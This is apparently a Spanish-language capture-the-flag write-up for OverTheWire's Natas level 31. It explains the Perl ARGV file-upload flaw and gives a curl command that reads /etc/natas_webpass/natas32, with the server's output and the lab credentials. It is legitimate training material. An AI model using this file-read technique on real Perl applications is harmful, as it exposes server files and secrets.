# Natas 31

#### URL: http://natas31.natas.labs.overthewire.org/
#### Credenciales: natas31:m7bfjAHpJmSYgQWWeqRE2qVBuMiRNq0y

En Perl hay una vulnerabilidad al subir archivos, y es que el operador <> no acepta cadenas a menos que sea ARGV, en cuyo caso iterará sobre los ARG pasados como argumentos y los insertara en una llamada a open()

En resumen, AFR:

![2025-03-21-153213_1366x768_scrot](https://github.com/user-attachments/assets/c2a47dbd-b87d-480b-b6d9-3baf828aa987)

Solo tenemos que pasar "ARGV" como `el primer valor` con el mismo identificador que el archivo a subir
```
echo "1;2;3;4" > file.csv
curl -u natas31:m7bfjAHpJmSYgQWWeqRE2qVBuMiRNq0y -F file=ARGV -F file=@/home/kalcast/Laboratorio/file.csv submit=Upload http://natas31.natas.labs.overthewire.org/index.pl?/etc/natas_webpass/natas32
curl: (3) URL rejected: Bad hostname
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN">
<head>
<!-- This stuff in the header has nothing to do with the level -->
<!-- Bootstrap -->
<link href="bootstrap-3.3.6-dist/css/bootstrap.min.css" rel="stylesheet">
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas31", "pass": "<censored>" };</script>
<script src="sorttable.js"></script>
</head>
<script src="bootstrap-3.3.6-dist/js/bootstrap.min.js"></script>

<!-- morla/10111 -->
<style>
#content {
    width: 900px;
}
.btn-file {
    position: relative;
    overflow: hidden;
}
.btn-file input[type=file] {
    position: absolute;
    top: 0;
    right: 0;
    min-width: 100%;
    min-height: 100%;
    font-size: 100px;
    text-align: right;
    filter: alpha(opacity=0);
    opacity: 0;
    outline: none;
    background: white;
    cursor: inherit;
    display: block;
}

</style>

<h1>natas31</h1>
<div id="content">
<table class="sortable table table-hover table-striped"><tr><th>NaIWhW2VIrKqrc7aroJVHOZvk3RQMi0B
</th></tr></table><div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>
```

#### Visualizacion de la peticion en Burpsuite

![2025-03-21-154409_1062x361_scrot](https://github.com/user-attachments/assets/0d49df2f-72ff-48f6-87e1-1f3d865d6bae)

`natas32:NaIWhW2VIrKqrc7aroJVHOZvk3RQMi0B`

PD: The Perl Jam 2 --> https://www.youtube.com/watch?v=BYl3-c2JSL8
